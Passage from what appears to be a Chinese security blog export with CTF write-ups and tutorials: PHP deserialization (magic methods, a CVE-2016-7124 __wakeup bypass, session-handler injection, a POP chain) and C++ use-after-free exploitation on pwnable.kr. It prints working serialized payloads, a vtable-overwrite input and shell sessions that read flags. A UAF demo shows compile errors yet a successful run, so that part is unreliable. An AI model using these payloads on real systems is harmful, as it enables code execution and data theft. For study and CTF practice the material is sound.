$this-&gt;flag = $flag; } public function get_flag() { return $this-&gt;flag; }} $test = file_get_contents('a.txt'); $test = unserialize($test); echo $test-&gt;b2.&quot;&lt;br&gt;&quot;; echo $test-&gt;get_flag();?&gt; 12╰─$ php test1.phpbbb&lt;br&gt;ol4three% 魔术方法 __construct：在创建对象时候初始化对象，一般用于对变量赋初值。 __destruct：和构造函数相反，当对象所在函数调用完毕后执行。 __toString：当对象被当做一个字符串使用时调用。 __sleep：序列化对象之前就调用此方法(其返回需要一个数组)。 __wakeup：反序列化恢复对象之前调用该方法。 __call：当调用对象中不存在的方法会自动调用该方法。 __get：在调用私有属性的时候会自动执行。 __isset( )在不可访问的属性上调用isset( )或empty( )触发。 __unset( )在不可访问的属性上使用unset( )时触发。 比较重要的方法__sleep() serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。 __wakeup() unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。 实例： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php class Caiji{ public function __construct($ID, $sex, $age){ $this-&gt;ID = $ID; $this-&gt;sex = $sex; $this-&gt;age = $age; $this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age); } public function getInfo(){ echo $this-&gt;info . '&lt;br&gt;'; } /** * serialize前调用 用于删选需要被序列化存储的成员变量 * @return array [description] */ public function __sleep(){ echo __METHOD__ . '&lt;br&gt;'; return ['ID', 'sex', 'age']; } /** * unserialize前调用 用于预先准备对象资源 */ public function __wakeup(){ echo __METHOD__ . '&lt;br&gt;'; $this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age); }}$me = new Caiji('twosmi1e', 20, 'male');$me-&gt;getInfo();//存在__sleep(函数，$info属性不会被存储$temp = serialize($me);echo $temp . '&lt;br&gt;';$me = unserialize($temp);//__wakeup()组装的$info$me-&gt;getInfo();?&gt; __toString() __toString()方法用于一个类被当成字符串时应怎样回应。例如echo $obj; 应该是显示些什么。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR级别的致命错误 实例： 123456789101112131415161718&lt;?php class Caiji{ public function __construct($ID, $sex, $age){ $this-&gt;ID = $ID; $this-&gt;sex = $sex; $this-&gt;age = $age; $this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age); } public function __toString(){ return $this-&gt;info; }}$me = new Caiji('ol4three', 18, 'male');echo '__toString:' . $me . '&lt;br&gt;';?&gt; 热身题实例： 题目是网鼎杯中青龙组的一道历年真题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); }}function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;}if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); }} 分析： 123456if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } isset判断get传过来的参数有没有数据。然后if判断，这里用到了一个过滤的函数，我们不用管。 $obj = unserialize($str)；这里使用到了一个反序列化的函数。反序列化GET传过来的参数。 function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); }在这里可以看到当对象结束（销毁）的时候会调用这个函数，我们可以看到if 判断op === “2” 然后调用process(); 12345678910public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); }} 我们可以看到，如果op == “1” 会调用write写入函数，如果op == “2”” 的话，会调用read函数。 所以需要使得op = “2”才能获取flag 上面__destruct()函数中为op === “2” 利用PHP弱类型的特性使得 op=” 2”即可绕过 === 时使得后面语句无法使用==空格会先做转义 然后执行read()函数 private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; }构造语句： 123456789&lt;? class FileHandler{ public $op = ' 2'; public $filename = 'flag.php'; public $content = 'ol4three'; } $flag = new FileHandler(); echo serialize($flag);?&gt; 12╰─$ php test.phpO:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:8:&quot;ol4three&quot;;} payload: 1http://127.0.0.1:8080?str=O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:8:&quot;ol4three&quot;;} 反序列化对象注入CVE-2016-7124 __wakeup绕过概要当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 构造序列化对象：O:1:”A”:1:{s:6:”target”;s:18:”“;}绕过__wakeup：O:2:”A”:1:{s:6:”target”;s:18:”“;} 漏洞影响版本php5 &lt; 5.6.25php7 &lt; 7.0.10 漏洞复现代码： 1234567891011121314151617&lt;? class A{ public $target = &quot;test&quot;; function __wakeup(){ $this-&gt;target = &quot;wakeup!&quot;; } function __destruct(){ $fp = fopen(&quot;/Library/WebServer/Documents/hello.php&quot;,&quot;w&quot;); fputs($fp,$this-&gt;target); fclose($fp); } } $a = $_GET['test']; $b = unserialize($a); echo &quot;hello.php&quot;.&quot;&lt;br/&gt;&quot;; include(&quot;./hello.php&quot;);?&gt; 魔法函数__wakeup()要比__destruct()先执行，所以我们之间传入O:1:&quot;A&quot;:1:{s:6:&quot;target&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;}时会被先执行的__wakeup()函数$target赋值覆盖为wakeup!，然后生成的hello.php里面的内容就是wakeup! 现在我们根据绕过方法：对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行，对象个数原来是1我们将其改为2，也就是O:2:&quot;A&quot;:1:{s:6:&quot;target&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;}就能实现绕过 Session 反序列化漏洞简介 PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化在php.ini中有以下配置项，wamp的默认配置如图 session.save_path 设置session的存储路径session.save_handler 设定用户自定义存储函数session.auto_start 指定会话模块是否在请求开始时启动一个会话session.serialize_handler 定义用来序列化/反序列化的处理器名字。默认使用php除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同 php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 php 键名＋竖线＋经过serialize()函数反序列处理的值 php_serialize serialize()函数反序列处理数组方式 存储机制php中的session内容是以文件方式来存储的，由session.save_handler来决定。文件名由sess_sessionid命名，文件内容则为session序列化后的值。来测试一个demo 123456&lt;?php ini_set('session.serialize_handler','php_serialize'); session_start(); $_SESSION['name'] = 'ol4three';?&gt; 运行后在配置文件设定的路径中会生成一个session文件 存储引擎为php_serialize: 存储引擎为php: 存储引擎为php_binary: 三种处理器的存储格式差异，就会造成在session序列化和反序列化处理器设置不当时的安全隐患。 如何利用Jarvisoj Web 题目地址：http://web.jarvisoj.com:32784/index.php 1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO{ public $mdzz; function __construct() { $this-&gt;mdzz = 'phpinfo();'; } function __destruct() { eval($this-&gt;mdzz); }}if(isset($_GET['phpinfo'])){ $m = new OowoO();}else{ highlight_string(file_get_contents('index.php'));}?&gt; http://web.jarvisoj.com:32784/index.php?phpinfo 先来看一看phpinfo里的内容 php版本：5.6.21php大于5.5.4的版本中默认使用php_serialize规则 默认为php_serialize而index.php中又使用了php，反序列化和序列化使用的处理器不同，由于格式的原因会导致数据无法正确反序列化，那么就可以通过构造伪造任意数据。 PHP手册Session 上传进度当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。 了解了之后，就可以通过POST方法来构造数据传入$_SESSION构造POST提交表单 12345&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 构造序列化字符串 123456789&lt;?phpclass OowoO{ public $mdzz='print_r(dirname(__FILE__));';}$obj = new OowoO();$a = serialize($obj);var_dump($a); 注意需要转义，抓包吧filename改为payload最终提交为：|O:5:\\&quot;OowoO\\&quot;:1:{s:4:\\&quot;mdzz\\&quot;;s:27:\\&quot;print_r(dirname(__FILE__));\\&quot;;} 目录/opt/lampp/htdocs|O:5:\\&quot;OowoO\\&quot;:1:{s:4:\\&quot;mdzz\\&quot;;s:36:\\&quot;print_r(scandir(dirname(__FILE__)));\\&quot;;}读目录 用file_get_contents函数读flag|O:5:\\&quot;OowoO\\&quot;:1:{s:4:\\&quot;mdzz\\&quot;;s:88:\\&quot;print_r(file_get_contents(\\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\&quot;));\\&quot;;} POP链构造POP：面向属性编程 面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。 基本概念在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：进行反序列化的数据能够被用户输入所控制。 pop链利用一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。 实战训练12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phpclass start_gg{ public $mod1; public $mod2; public function __destruct() { $this-&gt;mod1-&gt;test1(); }}class Call{ public $mod1; public $mod2; public function test1() { $this-&gt;mod1-&gt;test2(); }}class funct{ public $mod1; public $mod2; public function __call($test2,$arr) { $s1 = $this-&gt;mod1; $s1(); }}class func{ public $mod1; public $mod2; public function __invoke() { $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1; } }class string1{ public $str1; public $str2; public function __toString() { $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; }}class GetFlag{ public function get_flag() { echo &quot;flag:&quot;.&quot;this_i3_you4_flag&quot;; }}$a = $_GET['string'];unserialize($a);?&gt; 可以看到需要执行GetFlag类中的get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个POP链。 string1中的__tostring存在$this-&gt;str1-&gt;get_flag()，分析一下要自动调用__tostring()需要把类string1当成字符串来使用，因为调用的是参数str1的方法，所以需要把str1赋值为类GetFlag的对象。 发现类func中存在__invoke方法执行了字符串拼接，需要把func当成函数使用自动调用__invoke然后把$mod1赋值为string1的对象与$mod2拼接。 在funct中找到了函数调用，需要把mod1赋值为func类的对象，又因为函数调用在__call方法中，且参数为$test2,即无法调用test2方法时自动调用 __call方法； 在Call中的test1方法中存在$this-&gt;mod1-&gt;test2();，需要把$mod1赋值为funct的对象，让__call自动调用。 查找test1方法的调用点，在start_gg中发现$this-&gt;mod1-&gt;test1();，把$mod1赋值为start_gg类的对象，等待__destruct()自动调用。 Payload: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass start_gg{ public $mod1; public $mod2; public function __construct() { $this-&gt;mod1 = new Call();//把$mod1赋值为Call类对象 } public function __destruct() { $this-&gt;mod1-&gt;test1(); }}class Call{ public $mod1; public $mod2; public function __construct() { $this-&gt;mod1 = new funct();//把 $mod1赋值为funct类对象 } public function test1() { $this-&gt;mod1-&gt;test2(); }}class funct{ public $mod1; public $mod2; public function __construct() { $this-&gt;mod1= new func();//把 $mod1赋值为func类对象 } public function __call($test2,$arr) { $s1 = $this-&gt;mod1; $s1(); }}class func{ public $mod1; public $mod2; public function __construct() { $this-&gt;mod1= new string1();//把 $mod1赋值为string1类对象 } public function __invoke() { $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1; } }class string1{ public $str1; public function __construct() { $this-&gt;str1= new GetFlag();//把 $str1赋值为GetFlag类对象 } public function __toString() { $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; }}class GetFlag{ public function get_flag() { echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;; }}$b = new start_gg;//构造start_gg类对象$becho urlencode(serialize($b)).&quot;&lt;br /&gt;&quot;;//显示输出url编码后的序列化对象 总结反序列化漏洞一般都是在白盒审计时发现并利用，需要构造PHP序列化代码，利用条件比较苛刻。 总结一下PHP反序列化的挖掘思路，首先进行反序列化的数据点是用户可控的，然后反序列化类中需要有魔术方法，魔术方法中存在敏感操作，或者魔术方法中无敏感操作，但是其对象调用了其他类中的同名函数，可以通过构造POP链利用。 另外再贴一些相关文章，希望对大家有所帮助 参考链接https://xz.aliyun.com/t/6753 https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ https://xz.aliyun.com/t/3674#toc-17","link":"/2021/01/22/CTF/Web/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5/"},{"title":"pwnable.kr uaf","text":"考察点 虚函数的内存地址空间 UAF 虚函数的内存地址在C++中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据。对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据。 Code：1234567891011121314151617181920212223242526272829303132class Base { public: virtual void f() { cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; } virtual void g() { cout &lt;&lt; &quot;Base::g&quot; &lt;&lt; endl; } virtual void h() { cout &lt;&lt; &quot;Base::h&quot; &lt;&lt; endl; } int base; protected: private: }; //子类1，无虚函数重载 class Child1 : public Base { public: virtual void f1() { cout &lt;&lt; &quot;Child1::f1&quot; &lt;&lt; endl; } virtual void g1() { cout &lt;&lt; &quot;Child1::g1&quot; &lt;&lt; endl; } virtual void h1() { cout &lt;&lt; &quot;Child1::h1&quot; &lt;&lt; endl; } int child1; protected: private: }; //子类2，有1个虚函数重载 class Child2 : public Base { public: virtual void f() { cout &lt;&lt; &quot;Child2::f&quot; &lt;&lt; endl; } virtual void g2() { cout &lt;&lt; &quot;Child2::g2&quot; &lt;&lt; endl; } virtual void h2() { cout &lt;&lt; &quot;Child2::h2&quot; &lt;&lt; endl; } int child2; protected: private: }; 单一继承，无虚函数重载 单一继承，重载了虚函数 多重继承 总结 如果一个类中有虚函数，那么就会建立一张虚函数表vtable，子类继承父类vtable，若，父类的vtable中私有(private)虚函数,则子类vtable中同样有该私有(private)虚函数的地址。注意这并不是直接继承了私有(private)虚函数 当子类重载父类虚函数时，修改vtable同名函数地址，改为指向子类的函数地址，若子类中有新的虚函数，在vtable尾部添加。 vptr每个对象都会有一个，而vptable是每个类有一个，vptr指向vtable，一个类中就算有多个虚函数，也只有一个vptr；做多重继承的时候，继承了多个父类，就会有多个vptr UAF可以看上一遍介绍 题目链接http://pwnable.kr/play.phphttps://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uafhttps://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uaf.cpp 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;fcntl.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human{private: virtual void give_shell(){ system(&quot;/bin/sh&quot;); }protected: int age; string name;public: virtual void introduce(){ cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl; }};class Man: public Human{public: Man(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl; }};class Woman: public Human{public: Woman(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl; }};int main(int argc, char* argv[]){ Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1){ cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; cin &gt;&gt; op; switch(op){ case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0;} 分析首先查看一下保护 1234567uaf@pwnable:~$ checksec uaf[*] '/home/uaf/uaf' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 因为这是一道开源pwn，给了我们源码，而且代码也不复杂，没有什么逆向的必要，为了方便理解，我就直接从源码进行分析。 类的继承和虚表可以看出Man和Woman都是继承了Human类，并且可以看出只要我们将控制流劫持到Human类的私有虚函数give_shell，就能getshell了。Man和Woman都继承了Human类的vtable，可以通过调试，跟随子类的构造函数，找到vtable。 12345678910111213141516171819202122232425262728293031323334353637class Human{private: virtual void give_shell(){ system(&quot;/bin/sh&quot;); }protected: int age; string name;public: virtual void introduce(){ cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl; }};class Man: public Human{public: Man(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl; }};class Woman: public Human{public: Woman(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl; }}; UAF123456789101112131415161718192021222324252627Human* m = new Man(&quot;Jack&quot;, 25);Human* w = new Woman(&quot;Jill&quot;, 21);size_t len;char* data;unsigned int op;while(1){ cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; cin &gt;&gt; op; switch(op){ case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; } } 可以看出程序给了我们3个选项 use 使用指针指向的函数 after 分配一段地址空间，我们可以用其将已经被free的内存，重新allocate free 将指针指向的内存释放 组合起来就是UAF。 利用思路 调试找到虚表中give_shell函数地址。 free后再allocate，得到一个可控的地址空间. 为了在use，即m-&gt;introduce()时，将本来执行的introduce函数变成执行give_shell函数，在allocate的同时，改写虚表指针。 劫持控制流，执行give_shell 漏洞调试和利用找到Man的构造函数，从而找到虚函数表 1234567891011121314gef➤ b * 0x400f13gef➤ nigef➤ p $ebx //在构造函数处下断点$1 = 0x614c50gef➤ p /x $ebx //打印出实例化的Man对象的地址$2 = 0x614c50gef➤ x/10 0x614c50 //查看Man对象的内存地址空间虚表地址为0x4015700x614c50: 0x00401570 0x00000000 0x00000019 0x000000000x614c60: 0x00614c38 0x00000000 0x000203a1 0x000000000x614c70: 0x00000000 0x00000000gef➤ x/10 0x004015700x401570 &lt;_ZTV3Man+16&gt;: 0x0040117a 0x00000000 0x004012d2 0x000000000x401580 &lt;_ZTV5Human&gt;: 0x00000000 0x00000000 0x004015f0 0x000000000x401590 &lt;_ZTV5Human+16&gt;: 0x0040117a 0x00000000 覆盖虚表指针123456gef➤ x/10 0x004015700x401570 &lt;_ZTV3Man+16&gt;: 0x0040117a 0x00000000 0x004012d2 0x000000000x401580 &lt;_ZTV5Human&gt;: 0x00000000 0x00000000 0x004015f0 0x000000000x401590 &lt;_ZTV5Human+16&gt;: 0x0040117a 0x000000000x0040117a give_shell 0x004012d2 introduce call introduce 可以看出在执行m-&gt;introduce()的时候，调用call [vptr+8]。为了执行give_shell，我们覆盖虚表指针，让它前移8个字节，这样call [vptr+8]的时候就调用give_shell了。 )give_shell() 的地址一共有三个，分别对应 Human Man Woman 虚函数表内 give_shell() 的地址从这三个地址中任选一个 - 8，作为新的 Man 的虚表地址。 allocate 从上图可以看出，原本Man对象分配的堆空间是0x18，即24字节，所以我们在再次分配的时候，也要分配24字节，保证自己拿到的是原先被free掉的地址空间。 12345Human* m = new Man(&quot;Jack&quot;, 25);Human* w = new Woman(&quot;Jill&quot;, 21);...delete m;delete w; 因为先free m再free w，所以为了再次拿到m所指向的空间，我们需要分配两次，第一次得到w所指向的空间，第二次才再次得到m所指向的空间 123len = atoi(argv[1]);data = new char[len];read(open(argv[2], O_RDONLY), data, len); 在此题中，是通过从文件中读出内容覆盖原先的内容的，等同于之前写的strcpy(p-&gt;name,data)，读取的长度是命令行的argv[1]，打开的文件是argv[2] 10x401570-0x8=0x401568-&gt;\\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00 getshell123456789101112131415161718192021222324uaf@pwnable:~$ python -c &quot;print '\\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00'&quot; &gt; /tmp/uaf.txtuaf@pwnable:~$ ./uaf 24 /tmp/uaf.txt1. use2. after3. free31. use2. after3. free2your data is allocated1. use2. after3. free2your data is allocated1. use2. after3. free1$ lsflag uaf uaf.cpp$ cat flagyay_f1ag_aft3r_pwning 参考链接http://www.cnblogs.com/bizhu/archive/2012/09/25/2701691.html https://eternalsakura13.com/2018/02/13/uaf/","link":"/2021/01/27/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwnable.kr/pwnable-kr-uaf/"},{"title":"Use After Free","text":"原理简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。 而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。 这里给出一个简单的例子 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef void (*func_ptr)(char *);void evil_fuc(char command[]){system(command);}void echo(char content[]){printf(&quot;%s&quot;,content);}int main(){ func_ptr *p1=(func_ptr*)malloc(4*sizeof(int)); printf(&quot;malloc addr: %p\\n&quot;,p1); p1=echo; p1(&quot;hello world\\n&quot;); free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针 p1(&quot;hello again\\n&quot;); //p1指针未被置空,虽然free了,但仍可使用. func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来. printf(&quot;malloc addr: %p\\n&quot;,p2); printf(&quot;malloc addr: %p\\n&quot;,p1);//p2与p1指针指向的内存为同一地址 p1=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针. p2(&quot;/bin/sh&quot;); return 0;} 编译： $ gcc 2.cpp -o 2 -m322.cpp: In function ‘int main()’:2.cpp:16:7: error: cannot convert ‘void(char*)’ to ‘void (**)(char*)’ in assignment p1=echo; ^2.cpp:17:23: error: ‘p1’ cannot be used as a function p1(&quot;hello world\\n&quot;); ^2.cpp:19:23: error: ‘p1’ cannot be used as a function p1(&quot;hello again\\n&quot;); //p1指针未被置空,虽然free了,但仍可使用. ^2.cpp:23:7: error: cannot convert ‘void(char*)’ to ‘void (**)(char*)’ in assignment p1=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成 ^2.cpp:24:17: error: ‘p2’ cannot be used as a function p2(&quot;/bin/sh&quot;); 运行结果如下: $ ./2 malloc addr: 0x8e83008hello worldhello againmalloc addr: 0x8e83008malloc addr: 0x8e83008$ iduid=1000(oldthree) gid=1000(oldthree) groups=1000(oldthree),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) 例题这里我们以 HITCON-training 中的 lab 10 hacknote 为例。 功能分析我们可以简单分析下程序，可以看出在程序的开头有个 menu 函数，其中有 puts(&quot; 1. Add note &quot;); puts(&quot; 2. Delete note &quot;); puts(&quot; 3. Print note &quot;); puts(&quot; 4. Exit &quot;); 故而程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。 add_note根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容。 unsigned int add_note(){ note *v0; // ebx signed int i; // [esp+Ch] [ebp-1Ch] int size; // [esp+10h] [ebp-18h] char buf; // [esp+14h] [ebp-14h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( count &lt;= 5 ) { for ( i = 0; i &lt;= 4; ++i ) { if ( !notelist[i] ) { notelist[i] = malloc(8u); if ( !notelist[i] ) { puts(&quot;Alloca Error&quot;); exit(-1); } notelist[i]-&gt;put = print_note_content; printf(&quot;Note size :&quot;); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = notelist[i]; v0-&gt;content = malloc(size); if ( !notelist[i]-&gt;content ) { puts(&quot;Alloca Error&quot;); exit(-1); } printf(&quot;Content :&quot;); read(0, notelist[i]-&gt;content, size); puts(&quot;Success !&quot;); ++count; return __readgsdword(0x14u) ^ v5; } } } else { puts(&quot;Full&quot;); } return __readgsdword(0x14u) ^ v5;} print_noteunsigned int print_note(){ int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) { puts(&quot;Out of bound!&quot;); _exit(0); } if ( notelist[v1] ) notelist[v1]-&gt;put(notelist[v1]); return __readgsdword(0x14u) ^ v3;} delete_notedelete_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的。 unsigned int del_note(){ int v1; // [esp+4h] [ebp-14h] char buf; // 